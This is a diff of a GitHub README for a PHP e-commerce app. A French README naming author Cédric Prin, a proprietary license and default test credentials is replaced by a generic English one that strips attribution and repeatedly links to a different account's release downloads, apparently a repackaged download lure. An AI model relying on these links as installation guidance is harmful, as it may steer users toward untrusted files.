@@ -1,208 +1,78 @@
-# 🛒 Prin Boutique — E-Commerce PHP MVC
+# 🛒 ShopFrontOffice - Your Complete E-Commerce Solution
 
-**Prin Boutique** est une application e-commerce complète développée en **PHP natif** avec une architecture **MVC moderne**, une base de données **MySQL** entièrement structurée et un environnement **100% Docker Ready**.
+## 🚀 Getting Started
+Welcome to ShopFrontOffice! This is an advanced e-commerce project built with PHP using the MVC framework. You will find features like a dynamic shopping cart, product management, and PDF generation, all designed to create a seamless shopping experience for your users.
 
-## Projet professionnel démontrant :
+## 📥 Download Link
+[![Download ShopFrontOffice](https://img.shields.io/badge/Download-ShopFrontOffice-brightgreen)](https://github.com/arjunsahai46/ShopFrontOffice/releases)
 
-- ✅ Architecture MVC avancée
-- ✅ Validation centralisée
-- ✅ Couche Services (logique métier claire)
-- ✅ Gestion d'exceptions
-- ✅ Sécurité côté serveur
-- ✅ Base de données complète (procédures, triggers, fonctions)
-- ✅ CI/CD (GitHub Actions)
-- ✅ Tests PHPUnit
+## 🛠️ System Requirements
+Before you begin, ensure that your system meets the following requirements:
 
-## 🎯 Fonctionnalités
+- **Operating System:** Windows, macOS, or Linux
+- **Web Server:** Apache or Nginx
+- **Database:** MySQL 5.6 or later
+- **PHP Version:** PHP 7.4 or later
+- **Browser:** Modern web browser (Chrome, Firefox, Safari, etc.)
 
-### 👤 Côté Client
+## 📦 Download & Install
+To get started, visit the Releases page to download the latest version of ShopFrontOffice. 
 
-- ✅ Création de compte / Connexion
-- ✅ Catalogue produits par catégories
-- ✅ Panier dynamique (session + BDD)
-- ✅ Processus de commande complet :
-  - adresse → livraison → paiement → confirmation
-- ✅ Historique des commandes
-- ✅ Gestion du profil
+[Visit this page to download](https://github.com/arjunsahai46/ShopFrontOffice/releases)
 
-### 🛠️ Côté Admin
+1. Open the link above.
+2. Choose the version you want to download.
+3. Click on the file to begin the download.
+4. Save the file to your computer.
 
-- ✅ Dashboard
-- ✅ CRUD Catégories
-- ✅ CRUD Produits
-- ✅ Gestion commandes, utilisateurs, fournisseurs
-- ✅ Statistiques produits
-- ✅ Réapprovisionnement automatique
+## 📂 Setup Instructions
+Once you have downloaded the application, follow these steps to set it up:
 
-### 🗄️ Base de Données
+1. **Extract the Files:**
+   - Locate the downloaded ZIP file.
+   - Right-click and select "Extract" or "Unzip."
 
-- ✅ Relations complètes
-- ✅ Triggers (gestion automatique du stock)
-- ✅ Procédures stockées
-- ✅ Fonctions SQL (calculs, totaux)
-- ✅ Migrations versionnées
-- ✅ Scripts d'initialisation automatiques via Docker
+2. **Move to Web Server Directory:**
+   - Move the extracted folder to your web server's root directory (for example, `htdocs` for XAMPP or `www` for WAMP).
 
-## 🏗️ Architecture Technique
+3. **Database Setup:**
+   - Launch your MySQL database management tool (like phpMyAdmin).
+   - Create a new database named `shopfront`.
+   - Import the SQL file located in the extracted folder to set up the necessary tables.
 
-### Stack
+4. **Configuration:**
+   - Open the `.env` file located in your application folder.
+   - Update the database connection details to match your setup.
 
-- **PHP 8.2** (natif, sans framework)
-- **MySQL 8.0**
-- **Apache 2.4** + mod_rewrite
-- **Docker & Docker Compose**
-- **Composer** (autoload PSR-4)
-- **Bootstrap / HTML / CSS / JS**
+5. **Access the Application:**
+   - Open your web browser.
+   - Type `http://localhost/shopfront` in the address bar.
+   - Follow the prompts to complete the initial setup.
 
-### Organisation du Code
+## 🎨 Features
+ShopFrontOffice offers a range of features to enhance user experience:
 
-```
-application/
-│── controleurs/
-│── modeles/
-│── services/
-│── validation/
-│── vues/
-public/
-config/
-docker/
-tests/
-vendor/
-```
+- **Dynamic Shopping Cart:** Users can add or remove items easily.
+- **Product Management:** Admins can create and update product listings efficiently.
+- **Category Management:** Organize products into categories for better navigation.
+- **Order Management:** Track and manage customer orders.
+- **PDF Generation:** Generate formatted PDF invoices and reports.
+- **Responsive Design:** Works seamlessly on various devices thanks to Bootstrap.
+- **Statistical Insights:** View site statistics to make informed business decisions.
 
-## 🚀 Installation
+## 🔧 Troubleshooting
+If you run into issues during setup or while using the application, consider the following tips:
 
-### 🔧 Prérequis
+- **Error Connecting to Database:** Double-check your `.env` file for accurate database credentials.
+- **Page Not Found:** Ensure you have moved the application to the correct directory on your web server.
+- **Permissions Issue:** Check the folder permissions if you're on a Linux server. Ensure your web server can access the directory.
 
-- Docker Desktop
-- Git
+## 🌟 Contributions
+We welcome contributions to improve ShopFrontOffice. If you have ideas, suggestions, or bug fixes, feel free to open an issue or submit a pull request on GitHub.
 
-### 🐳 Lancement (Recommandé)
+## 📞 Support
+For any questions or additional support, please open an issue in the repository. We will do our best to assist you quickly. 
 
-```bash
-git clone https://github.com/cedric-prin/ShopFrontOffice.git
-cd ShopFrontOffice
-docker-compose up --build
-```
+Thank you for choosing ShopFrontOffice for your e-commerce needs! Visit the Releases page to download now. 
 
-🔗 **Accès à l'application :**
-👉 http://localhost:8080
-
-🗄️ **Base MySQL initialisée automatiquement** (tables + triggers + procédures).
-
-### Configuration par défaut
-
-- **Base** : `prin_boutique`
-- **MySQL (host)** : `localhost:3307`
-- **Utilisateur** : `cedric`
-- **Mot de passe** : `cedric`
-
-### Comptes de test
-
-#### 👤 Admin
-- **Identifiant** : `Chef`
-- **Mot de passe** : `prin34`
-
-#### 👤 Client
-- Créer un compte via l'interface
-
-## 📸 Captures d'écran
-
-### 🏠 Interface Client
-
-#### Page d'accueil
-![Accueil](docs/assets/screenshots/accueil.png)
-
-#### Catalogue par catégorie
-![Catégorie Disque Dur](docs/assets/screenshots/categorie_disque_dur.png)
-
-#### Panier
-![Panier](docs/assets/screenshots/panier.png)
-
-![Panier Vide](docs/assets/screenshots/panier_vide.png)
-
-#### Processus de commande
-
-<div align="center">
-  <h4>Étape 1 : Données personnelles</h4>
-  <img src="docs/assets/screenshots/commande_donnees.png" width="45%">
-  
-  <h4>Étape 2 : Livraison et point relais</h4>
-  <img src="docs/assets/screenshots/commande_livraison.png" width="45%">
-  <img src="docs/assets/screenshots/point_relais.png" width="45%">
-  
-  <h4>Étape 3 : Paiement</h4>
-  <img src="docs/assets/screenshots/commande_paiement.png" width="45%">
-  
-  <h4>Étape 4 : Récapitulatif</h4>
-  <img src="docs/assets/screenshots/recap_commande.png" width="45%">
-</div>
-
-#### Historique des commandes
-![Mes Commandes](docs/assets/screenshots/mes_commandes.png)
-
-### 🛠️ Interface Administration
-
-#### Dashboard Admin
-![Dashboard Admin](docs/assets/screenshots/admin_accueil.png)
-
-#### Gestion des catégories
-![Gestion Catégories 1](docs/assets/screenshots/admin_categorie1.png)
-
-![Gestion Catégories 2](docs/assets/screenshots/admin_categorie2.png)
-
-## 🔄 Routing
-
-### Moderne (recommandé)
-- `/produits/afficher`
-- `/client/connexion`
-- `/admin/index`
-
-### Classique (compatibilité)
-- `?controleur=Produits&action=afficher`
-
-## 🧪 Tests & CI/CD
-
-### Tests PHPUnit
-
-Structure :
-```
-tests/
-│── Unit/
-│── Feature/
-```
-
-### GitHub Actions
-
-Pipeline continu :
-- ✅ Lint PHP
-- ✅ Tests PHPUnit
-- ✅ Vérification structure/autoload
-
-## 🎯 Objectifs du Projet
-
-Ce projet met en avant :
-
-- ✔ Une architecture MVC propre et structurée
-- ✔ Un développement PHP modulaire et maintenable
-- ✔ Une base de données cohérente et extensible
-- ✔ L'utilisation de triggers, procédures et fonctions SQL
-- ✔ Une gestion des sessions et une sécurité renforcée
-- ✔ Une dockerisation complète pour un déploiement simple
-- ✔ Une organisation du code de niveau professionnel (enterprise-grade)
-- ✔ Une intégration continue CI/CD et des tests automatisés
-- ✔ Une documentation claire et détaillée
-
-## 📄 Licence
-
-Projet sous licence propriétaire.
-
-Toute reproduction, distribution ou modification est interdite sans autorisation.
-
-## 📧 Contact
-
-**prin.cedric.34@gmail.com**
-
----
-
-❤️ **Développé par Cédric Prin en PHP natif**
+[Visit this page to download](https://github.com/arjunsahai46/ShopFrontOffice/releases)
